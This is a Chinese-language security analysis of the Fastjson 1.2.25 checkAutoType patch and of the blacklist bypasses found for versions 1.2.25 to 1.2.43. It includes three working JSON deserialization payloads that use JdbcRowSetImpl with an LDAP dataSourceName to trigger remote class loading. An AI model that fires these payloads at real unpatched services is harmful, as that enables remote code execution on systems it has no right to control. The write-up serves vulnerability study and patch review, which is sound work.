# Fastjson 1.2.25中的`checkAutoType`补丁分析

在Fastjson 1.2.25版本中，引入了`checkAutoType`机制来修复1.2.22至1.2.24版本中存在的安全漏洞。其中，`autoTypeSupport`默认设置为`False`。当`autoTypeSupport`被设为`False`时，首先进行黑名单过滤，然后是白名单过滤；如果白名单匹配成功，则直接加载该类，否则抛出错误。相反，若`autoTypeSupport`为`True`，则先尝试白名单过滤，只有当白名单未匹配上时才会执行黑名单过滤。无论`autoTypeSupport`是否开启，都有可能找到绕过这些限制的方法。

## 补丁绕过方法（需启用`AutoTypeSupport`）

要启用`AutoTypeSupport`功能，请使用如下代码：
```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

### 1.2.25-1.2.41版本的补丁绕过

#### 漏洞复现示例
**Payload:**
```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://localhost:1389/badNameClass", "autoCommit":true}
```

#### 调试与分析
通过在类名前添加字符`L`，可以绕过黑名单检查。在`checkAutoType`函数内部执行了一系列获取类的操作，由于提供的类型名称不存在，最终调用`loadClass`方法。在`TypeUtils.loadClass`过程中，会移除字符串开头的`L`和结尾的`;`以获得新的类名，并据此加载类，从而规避了`CheckAutoType`的安全检查。

### 1.2.25-1.2.42版本的补丁绕过

从1.2.42版开始，黑名单机制改为基于哈希值的方式，旨在防止对黑名单条目的逆向工程。然而，已知某些哈希值仍可被利用。
  
#### 漏洞复现示例
**Payload:**
```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1389/badNameClass", "autoCommit":true}
```

#### 分析
新版增加了额外的类名提取步骤，但可以通过嵌套更多层的`L`与`;`来绕过新增的安全措施。即使如此，在`TypeUtils.loadClass`阶段，程序依然能够通过循环调用自身的`loadClass`方法成功加载目标类。

### 1.2.25-1.2.43版本的补丁绕过

此版本加强了对非法字符序列如连续两个`L`或数组表示符`[`的检测，试图阻止上述绕过手段。

#### 漏洞复现示例
经过多次调整后的有效Payload：
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1389/badNameClass", "autoCommit":true}
```

#### 分析
尽管新版本增加了针对特定模式的防御措施，但通过巧妙构造JSON数据结构（例如在适当位置插入`[`和`{`），仍然可以触发预期外的行为并绕过现有防护机制。

### 受`AutoTypeSupport`状态影响的版本差异

- **开启`AutoTypeSupport`时**: 黑名单验证逻辑缺少关键条件判断，使得某些情况下即使存在黑名单项也能通过校验。
- **关闭`AutoTypeSupport`时**: 安全策略更为严格，仅允许预定义白名单内的类型反序列化。

## 1.2.48版改进

最新版本进一步强化了安全性，包括默认禁用类缓存以及将敏感的`Class`类加入黑名单等措施。

---

以上内容概述了不同Fastjson版本间存在的安全问题及其相应的绕过技术。开发人员应密切关注官方发布的更新信息，及时升级至最新稳定版以确保应用安全。